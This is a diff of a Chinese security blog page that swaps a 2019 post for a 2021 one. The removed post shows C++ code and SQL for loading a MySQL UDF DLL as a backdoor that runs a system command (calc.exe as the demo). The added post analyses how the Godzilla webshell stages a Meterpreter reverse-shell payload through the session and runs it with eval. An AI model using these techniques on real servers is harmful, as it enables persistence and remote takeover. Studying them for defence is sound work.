@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>mysql插件(后门)开发 | 九世的博客</title>
-  <meta name="keywords" content=" 后门 ">
-  <meta name="description" content="mysql插件(后门)开发 | 九世的博客">
+  <title>哥斯拉实现meterpreter分析 | 九世的博客</title>
+  <meta name="keywords" content=" 工具刨析 ">
+  <meta name="description" content="哥斯拉实现meterpreter分析 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1863,9 +1863,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-mysql插件-后门-开发" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-哥斯拉实现meterpreter分析" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">mysql插件(后门)开发</h1>
+        <h1 class="article-title">哥斯拉实现meterpreter分析</h1>
     
     <div class="article-meta">
         
@@ -1874,14 +1874,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">后门</a>
+            <a href="javascript:" class="color5">工具刨析</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-12-03 18:16:10">2019-12-03 17:49</time>
+        创建时间:<time class="date" title="更新时间: 2021-09-04 03:15:13">2021-09-04 03:08</time>
         
     </div>
     <div class="article-meta">
@@ -1903,7 +1903,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00前言"><span class="toc-text">0x00前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01正文"><span class="toc-text">0x01正文</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02参考链接"><span class="toc-text">0x02参考链接</span></a></li></ol>
+        
     
 <style>
     .left-col .switch-btn,
@@ -1918,40 +1918,25 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>早上看到某文章讲数据库维权。此时，群内某dalao发话表示，用dll做插件加载也可以（滑稽）。那么下午弄个来康康<br><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1575376974715&amp;di=c5b680b0659d2f3295802edb960352f2&amp;imgtype=0&amp;src=http%3A%2F%2Fi0.hdslb.com%2Fbfs%2Farticle%2Ff38a65a18cad5d1b09691e6ad913f81f2913e6ee.jpg" alt=""></p>
-<h2 id="0x01正文"><a href="#0x01正文" class="headerlink" title="0x01正文"></a>0x01正文</h2><p>环境：</p>
-<pre><code>VS2015
-Mysql头部文件
-</code></pre><p>mysql头部文件下载：<a href="https://downloads.mysql.com/archives/c-c/" target="_blank" rel="noopener">MySQL :: Download MySQL Connector/C (Archived Versions)</a></p>
-<p><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g9jowl0u7sj31b50l7ad6.jpg" alt=""></p>
-<p>创建一个静态DLL项目，然后引用外部文件（mysql-connector-c-6.1.11-winx64\include）<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g9joycgsulj30oq0nkdhz.jpg" alt=""></p>
-<p>将mysql-connector-c-6.1.11-winx64\lib文件夹下的libmysql.lib和libmysql.dll复制到项目根目录<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g9jp0u1kf6j30y60imjul.jpg" alt=""></p>
-<p>引用lib，导入mysql.h开始写即可</p>
-<pre><code class="c++">// ConsoleApplication1.cpp : 定义 DLL 应用程序的导出函数。
-//
-
-#include &quot;stdafx.h&quot;
-#include &lt;mysql.h&gt;
-#pragma comment(lib,&quot;libmysql&quot;) //引用lib文件
-
-extern &quot;C&quot; {
-    __declspec(dllexport) void udf_test() {
-        system(&quot;calc.exe&quot;);
-    }
-
-    __declspec(dllexport) my_bool udf_test_init() { //创建一个函数后要创建对应的 &quot;函数名_init()&quot;函数，不软会报错，如error.jpg
-        return 0;
-    }
-}
-</code></pre>
-<p><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g9jp3ehglij30it0cat9h.jpg" alt="error.jpg"></p>
-<p>编译环境选择Release x86,根据本机的环境不同而选择。如果x86生成出的dll加载错误就用x64生成在加载</p>
-<p>将生成的dll放入mysql的\lib\plugin文件夹下<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g9jp6g1gd5j30mz0ba74x.jpg" alt=""></p>
-<p>自定义一个函数，和dll里相同的函数。在调用即可弹出calc</p>
-<pre><code>CREATE FUNCTION udf_test RETURNS INTEGER SONAME &quot;dc.dll&quot;;
-select udf_test();
-</code></pre><p><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g9jp83ayj9j30pl0lpdiy.jpg" alt=""></p>
-<h2 id="0x02参考链接"><a href="#0x02参考链接" class="headerlink" title="0x02参考链接"></a>0x02参考链接</h2><p><a href="https://blog.csdn.net/albertsh/article/details/78567661" target="_blank" rel="noopener">mysql函数扩展之UDF开发</a><br><a href="https://blog.csdn.net/weixin_43134135/article/details/82391821" target="_blank" rel="noopener">windows+vs2017+C语言 引入mysql.h对MYSQL数据库的操作</a></p>
+        <p>哥斯拉version:1.0<br>Cryption:PHP_XOR_BASE64<br>这里分析的php首先定位到shells/plugins/php/assets/Meterpreter.class</p>
+<pre><code>* 先获取对于payload类型，然后从对应payload目录下读取反弹meterpreter的payload文件 （对应路径：plugins/&lt;scriptname&gt;/assets）
+* 调用对应payload里的include函数
+* include函数调用evalFunc，发送POST请求调用大马里的includeCode函数
+</code></pre><p><img src="https://z3.ax1x.com/2021/09/04/hccpa8.png" alt=""></p>
+<p>调用对应payload里的include函数<br><img src="https://z3.ax1x.com/2021/09/04/hcc9IS.png" alt=""></p>
+<p>通过get函数获取到$parameter数组里对应的binCode和codeName的value，最后写在session里（将反弹meterprter的payload拼接写到存大马的session文件里）<br><img src="https://z3.ax1x.com/2021/09/04/hccPPg.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/04/hcckxs.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/04/hccEMn.png" alt=""></p>
+<p>抓包如下<br><img src="https://z3.ax1x.com/2021/09/04/hccVrq.png" alt=""></p>
+<p>之后点击Go Button后触发GoButtonClick事件</p>
+<pre><code>* 发送POST请求调用大马里对应的run函数
+</code></pre><p><img src="https://z3.ax1x.com/2021/09/04/hccZq0.png" alt=""></p>
+<p>Run函数</p>
+<pre><code>* 获取传送过来的数据做好好下步划分的准备
+* 判断是否要进行bypass_open_basedir
+* 调用evalFunc函数执行反弹meterprter的code
+</code></pre><p><img src="https://z3.ax1x.com/2021/09/04/hccmZV.png" alt=""></p>
+<p>就是<code>eval($_SESSION[&quot;Meterpreter&quot;])</code><br><img src="https://z3.ax1x.com/2021/09/04/hccuIU.png" alt=""></p>
+<p>抓包如下<br>第二个PHPSESSIONID对应<code>$_SESSION[&quot;meterpter&quot;]</code><br><img src="https://z3.ax1x.com/2021/09/04/hccMiF.png" alt=""></p>
+<p><img src="https://z3.ax1x.com/2021/09/04/hccQG4.png" alt=""></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1961,12 +1946,12 @@ select udf_test();
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>mysql插件(后门)开发</p>
+    <p><span class="copy-title">文章标题:</span>哥斯拉实现meterpreter分析</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-12-03, 17:49:21</p>
-    <p><span class="copy-title">最后更新:</span>2019-12-03, 18:16:10</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/657d3c49.html" title="mysql插件(后门)开发">http://422926799.github.io/posts/657d3c49.html</a>
+    <p><span class="copy-title">发布时间:</span>2021-09-04, 03:08:51</p>
+    <p><span class="copy-title">最后更新:</span>2021-09-04, 03:15:13</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/19caa6fb.html" title="哥斯拉实现meterpreter分析">http://422926799.github.io/posts/19caa6fb.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
